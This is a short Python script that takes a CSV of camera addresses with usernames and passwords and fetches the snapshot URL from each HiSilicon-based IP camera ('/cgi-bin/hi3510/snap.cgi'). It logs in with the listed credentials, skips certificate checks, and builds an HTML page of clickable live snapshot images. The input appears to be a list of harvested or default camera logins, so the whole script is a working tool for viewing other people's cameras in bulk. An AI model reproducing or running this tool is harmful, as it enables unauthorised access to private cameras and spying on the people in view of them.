from sys import argv
from requests import get
import re
from threading import Thread

def build_html_line(url):
    return f'''<img \
    height = "176" \
    width = "320" \
    src = "{url}" \
    onerror = "this.style.display='none'" \
    onclick = "window.open('{url}', '_blank');" />\n'''

input_file = argv[1]
output_file = input_file.replace('.csv', '.html')
result_list = []
with open(input_file, 'r') as f:
    input_list = f.read().split('\n')
input_list = input_list[1:]
total = len(input_list)
for i, line in enumerate(input_list):
    try:
        data = line.split(',')
        socket, usr, pwd = data[0], data[1], data[2]
        url = 'http://%s:%s@%s/cgi-bin/hi3510/snap.cgi' % (usr, pwd, socket)
        # print(data[2])
        # if data[2] != 'Foscam' or data[3] == '':
        # print(data[3])
        # continue
        print(f'[{i + 1}/{total}] {url}')
        content = get(url, verify=False, timeout=1).text
        path = re.search(r'\"(.*?)\"', content).group(1)
        result_list.append(f'http://{usr}:{pwd}@{socket}{path}')
    except Exception as e:
        print(e)
        pass

with open(output_file, 'w') as f:
    for url in result_list:
        f.write(build_html_line(url))
